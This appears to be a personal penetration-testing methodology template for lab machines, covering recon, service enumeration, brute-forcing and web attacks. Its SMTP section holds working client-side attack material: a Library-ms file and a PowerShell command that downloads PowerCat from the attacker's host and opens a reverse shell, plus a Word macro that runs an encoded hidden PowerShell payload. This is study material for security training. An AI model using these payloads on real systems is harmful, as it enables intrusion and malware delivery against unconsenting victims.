

  



# NAME [IP] 

Use this manual: [https://book.hacktricks.xyz](#https://book.hacktricks.xyz)

Reverse shell cheatsheet: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](#https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Reverse shell generator: [https://www.revshells.com/](#https://www.revshells.com/)


## Initial Recon 

OS Check \(NMap\):

```
 nmap -O {IP} 
 ```


### ENUM 

Start deep enum process with AutoRecon\.py \(https://github\.com/Tib3rius/AutoRecon\.git\):

```
 python3 autorecon.py -o {output directory} {IP} -vv 
 ```


Enumerate again every port \(NMap\):

```
 nmap -p- {IP} 
 ```


Enumerate every service \(NMap\):

```
 nmap -p {service port} {IP} 
 ```


### VULN & EXPLOIT CHECK 

For every service found, we have to check the version on:
\- ExploitDB
\- SearchSploit
\- Rapid7

For every port with unidentified service we have to check “**port number \+ exploit**”  and check EVERY exploit for working\.
When an exploit is in Python2, we either:
\- repair it easily
\- get an existing updated version from issues or other branches in GitHub/GitLab etc\.

If an exploit gives us patched message or doesn't work, WE HAVE TO CHECK ANOTHER ONE, SAME SERVICE TO MAKE SURE THAT SERVICE IS UNEXPLOITABLE\.

## SERVICE ENUM  

We have to enumerate every service and gather as much information as possible\.

### TCP 

We will find the service report from AutoRecon\.py, name Full TCP Scan\.

#### FTP 

\- find the version, maybe it's a vulnerable one
\- check if we are allowed anonymous login \(user: anonymous\)

```
 sudo nmap -sV -p21 -sC -A {IP} 
 ```

\- get the certificate, if any

```
 openssl s_client -connect crossfit.htb:21 -starttls ftp 
 ```


We can try brute\-force with Hydra \(any username that we may find\):

```
 hydra -l {username} -P {wordlist} {IP} ftp 
 ```


More possible exploits here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)


#### SSH 

\- check vulnerable version, some may allow username enumerationtime\-based
\- audit the entire service using SSH\-audit \([https://github.com/jtesta/ssh-audit](#https://github.com/jtesta/ssh-audit)
\)

We can try brute\-force with Hydra \(any username that we may find\):

```
 hydra -l {username} -P {wordlist} {IP} ftp 
 ```


More possible exploits here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)


#### DNS 

\- try zone transfer

```
 dig axfr @<DNS_IP>
dig axfr @<DNS_IP> <DOMAIN> 
 ```

\- try reverse IP lookup

```
 dig -x {IP} @<DNS_IP> 
 ```

More exploits: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)


#### HTTP 

We have to **Dirbust**and **Feroxbust**using good wordlists:
\- /usr/share/seclists/Discovery/Web\-Content/big\.txt
\- /usr/share/seclists/Discovery/Web\-Content/directory\-list\-2\.3\-medium\.txt
\- /usr/share/seclists/Discovery/Web\-Content/directory\-list\-2\.3\-big\.txt \(if medium had no results\)

Also we have to check:
\- intersting exntensions \(docx, pdf, txt, php, sql\)
\- we have to check recursive
\- check if git is present on the server
\- check page contents, maybe credentials or something helpful is already there
\- check comments
\- check cookies and session

##### SQL injections 

\- check with quote “ ' ”
\- check the request in network tab for errors
\- check for time differences between **normal requests**and **ones that may have errors**

More on SQL injections:
\- [https://book.hacktricks.xyz/pentesting-web/sql-injection](#https://book.hacktricks.xyz/pentesting-web/sql-injection)

\- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](#https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)



##### SSRF 

\- if Windows, we can capture the Kerberos Ticket using Responder and SSRF
\- we can check for firwalls by checkinf if we get a request on more stranger ports \(open a HTTP server on our machine on 4444 and try to get a request\)

More on that here: [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](#https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)


It is also used to get inner services =\> we can request [http://127.0.0.1:21](#http://127.0.0.1:21)
and if the connection is refused, then the box does not have FTP running internal \(just an example\)\. Check this: [https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation](#https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation)


##### LFI & RFI 

\- we can try to include shells from our server
\[For LFI\] we can poison the access logs requiresting [http://url/malicious-payload](#http://url/malicious-payload)
then we can include the apache access log in order to execute the PHP payload that we included in it
Places for **access\.log**/var/log/apache/access\. log\.

More on that here: [https://book.hacktricks.xyz/pentesting-web/file-inclusion](#https://book.hacktricks.xyz/pentesting-web/file-inclusion)


##### Upload Feature 

\- We can try to get the **Kerberos Ticket**with **Responder**by catching the **request used to upload**, and **changing the path of the file we want to upload to our responder server**
\- We can try uplading reverse shells

Bypass methods for upload protection: 
\- [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](#https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)

\- [https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass](#https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass)


More on that here: [https://book.hacktricks.xyz/pentesting-web/file-upload](#https://book.hacktricks.xyz/pentesting-web/file-upload)


#### SMTP 

\- Check the version, some exim versions might be VULNERABLE\.
\- Check for **username enumeration**

This might be a sign that we can trigger initial intrusion using a client\-side attack
We can create a **config\.Library\-ms**

```
 <?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://{Our IP}</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription> 
 ```


Then we can run to start hosting a WebDav server:

```
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root
/home/kali/webdav/ 
 ```

And inside we must create a shortcut that will download PowerCat and start a reverse shell \(note that we also have to start a server on port 8000 to host PowerCat\):

```
 powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://{our
IP}:8000/powercat.ps1');
powercat -c {our IP} -p 4444 -e powershell" 
 ```


For Word Macros\. check this example:

```
 Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str +
"AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str +
"AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str +
"QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str +
"gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub 
 ```


For more check here: [https://github.com/glowbase/macro_reverse_shell](#https://github.com/glowbase/macro_reverse_shell)


### UDP 

\[ NMAP OVERVIEW \]

#### SNMP 

AutoRecon\.py will enumerate the service\.
Check out:
\- onesixtyone
\- snmpwalk

Enumerate the last command executed:

```
 snmpwalk -v 1 -c {community string} {IP}
NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
 ```

Also check RCE with SNMP \(requires community string with write permissions\): [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce)

Also check this out: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)


### STUCK? 

**Things to consider**
☐ Have you confirmed the service on the port manually and googled all the things \(the SSH string, the banner text, the source\)?
☐ Is there a service that will allow you to enumerate something useful \(i\.e\. usernames\) but maybe doesn't make that obvious \(e\.g\. RID brute\-force through SMB with crackmapexec or lookupsid\.py\)?
☐ Have you used the best wordlist possible for your tasks \(is there a better/bigger directory list? Is there a SecLists cred list for this service?\)
☐ Have you fuzzed the directories you have found for a\) more directories, or b\) common filetypes \-x php,pl,sh,etc
☐ Have you tried some manual testing \(MySQL, wireshark inspections\)
☐ Have you collected all the hashes**and cracked them**?
☐ Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
☐ Do the version numbers tell you anything about the host?
☐ Have you tried bruteforce \(cewl, patator\)?
☐ Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
☐ Try usernames found with **capital letter**, all **letters capital**
☐ Do you need to relax some of the terms used for searching? Instead of v2\.8 maybe we check for anything under 3\.
☐ Do you need a break?


## PRIVILEGE ESCALATION 

We have to pay attention to **files on the machine**, most of the time, this is how privilege escalation is done\.

### Linux 

Use:
\- linpeas
\- kernel exploit suggester

Check kernel manually:

```
 uname -a 
 ```

**\!Important**: If we don't have GCC to compille on the box, and we encounter errors when we try to execute the locally compiled exploit, we need to simulate the exploited environment, check this: [https://github.com/X0RW3LL/XenSpawn](#https://github.com/X0RW3LL/XenSpawn)
\.

Check files manually:

```
 find / -perm -04000 2>/dev/null 
 ```

\- check /optdirectory
\- check if /etc/passwdwritable
\- check if /etc/shadowreadable/writable

### Windows 



## POST-EX 



### ENUM 



#### SYSTEM 



#### FILES && DIR 



#### PERMISSIONS 



#### PROCESSES 



#### JOBS 



#### USERS && GROUPS 



#### NETWORK 



#### MISC 



#### SUMMARY OF VULNERABILITIES 

High level summary of the system's vulnerabilities \-\- basically a forced stop\-and\-check processing stage so as not to drop into rabbit holes\.



##### ATTACK SURFACE 

**What are****the vulnerabilities?**



**What seems most likely or most straightforward to leverage and why?**



**Do we have all the correct files/versions/access to exploit?**


### LOOT 



#### CREDS 



#### HASHES 



#### PROOF 



## SUMMARY OF ESCALATION 

**Name**:
**Link**:
**TYPE**:
**EXPLANATION**:


**HOW WAS THIS DISCOVERED **\(should be in steps for enum, vuln\)?


**HOW WAS THIS EXPLOITED?**

POC here\.

**SCREENSHOTS**:

☐ ifconfig \&\& whoami \&\& proof\.txt
☐ Shell/similar



======
**
STEPS:**

## LOG 

Useful for keeping track of work when you leave a box for awhile and come back to it\.

## MISC NOTES 

Dump whatever in here\.